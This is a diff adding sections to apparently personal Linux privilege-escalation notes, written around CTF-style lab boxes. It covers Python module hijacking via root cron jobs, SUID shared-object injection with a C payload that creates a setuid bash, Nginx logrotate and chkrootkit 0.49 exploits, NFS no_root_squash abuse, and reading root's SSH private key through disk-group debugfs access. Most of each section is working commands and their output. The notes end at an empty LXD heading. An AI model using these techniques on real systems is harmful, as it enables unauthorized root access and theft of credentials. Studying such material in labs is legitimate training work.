@@ -31,6 +31,24 @@ Tags :
 
 [Tar wildcard injection](#Tar-wildcard-injection)
 
+[Python Module Injection](#Python-Module-Injection)
+
+[Shared Object Injection](#Shared-Object-Injection)
+
+[Nginx Logrotate CVE](#Nginx-Logrotate-CVE)
+
+[Chkrootkit 0.49 CVE](#Chkrootkit-0.49-CVE)
+
+[NFS Root Squashing](#NFS-Root-Squashing)
+
+[Disk Group](#Disk-Group)
+
+[LXD Group](#Disk-Group)
+
+[Docket Group](#Docker-Group)
+
+[Initctl Jobs](#Initctl-Jobs)
+
 ## MySQL Service as root
 
 if mysql service is running as root and we have root credentials then we can execute commands via **User-DefinedFunctions**
@@ -364,5 +382,160 @@ echo "" > "--checkpoint=1"
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "reverse shell" > shell.sh
 ```
+
+
+## Python Module Injection
+
+when there is python script run by cron job as root
+see what modules it imports 
+say it imports os module 
+and the python script is in say /home/arrow 
+if you can write to that directory then create a os.py file in the same folder as of that cronjob script
+then put a python reverse shell in it 
+whenever cron job executes it script imports this os.py file and executes it
+if that directory is not writable then check permissions in
+```
+/usr/lib/python3/os.py
+or
+/usr/lib/python2/os.py
+```
+
+if thats writable then add reverse shell to that file
+```
+cd /home/arrow
+echo "reverse shell " > os.py
+```
+
+
+## Shared Object Injection
+
+we can find binaries using find command
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+in our case its /usr/local/bin/suid-so
+to run functions in .so file this binary should open it or access it 
+we can use strace to see what systemcalls its using
+```bash
+TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+```
+its using a .so file from /home/user/.config directory and its name is libcalc.so 
+create a file in that directory with that name
+put this c code into that libcacl.c
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+now compile with gcc
+`gcc libcalc.c -shared -fPIC -o libcalc.so`
+
+now run that binary
+```bash
+TCM@debian:~/.config$ gcc libcalc.c -shared -fPIC -o libcalc.so
+TCM@debian:~/.config$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# whoami
+root
+```
+
+
+## Nginx Logrotate CVE
+
+this works only when we are www-data and <=1.6.2
+```bash
+www-data@debian:/home/user/tools/nginx$ dpkg -l | grep nginx
+ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
+ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
+```
+
+download this shellscript and execute it with /var/log/nginx/error.log as argument
+now we need to wait until logrotate occurs
+we can manually trigger this with root user
+or if there is any cronjob triggering this
+
+```bash
+./nginxed-root.sh /var/log/nginx/error.log
+and in other root shell 
+invoke-rc.d nginx rotate >/dev/null 2>&1
+```
+and we get the rootshell
+
+
+## Chkrootkit 0.49 CVE
+
+chkrootkit has local privesc cve
+put binary named 'update' in /tmp 
+put reverse shell in update and chmod +x it 
+
+whenever cron job executes chkrootkit it executes /tmp/update 
+
+## NFS Root Squashing
+
+when a nfs share has no_root_squash this means that root user on client can access that share with root privileges
+type cat /etc/exports on victim box and u can see /tmp with no_root_squash 
+```
+showmount -e 10.10.121.162
+Export list for 10.10.121.162:
+/tmp *
+```
+
+switch to root user on kali and
+lets mount in /tmp/share1
+```bash
+mount -o rw,vers=2 10.10.121.162:/tmp /tmp/share1
+```
+
+now create a  binary and put a reverse shell in it
+```bash
+touch /tmp/share1/shell
+echo "reverse shell" > /tmp/share1/shell
+chmod +s /tmp/share1/shell
+```
+
+now from victim box with low privileged user
+execute /tmp/shell
+we get root shell
+
+
+## Disk Group
+
+use id command to see what groups we are in
+if we are member of disk group we can try to read contents as root user 
+we can use debugfs on the corresponding /dev/sda
+in my case its /dev/sda6
+generally its /dev/sda1
+```
+└─$ debugfs /dev/sda6
+debugfs 1.45.5 (07-Jan-2020)
+debugfs:  cat /home/arrow/flag.txt
+u got it
+debugfs:  cat /root/.ssh/id_rsa
+u get the private key
+```
+
+## LXD Group
 
 
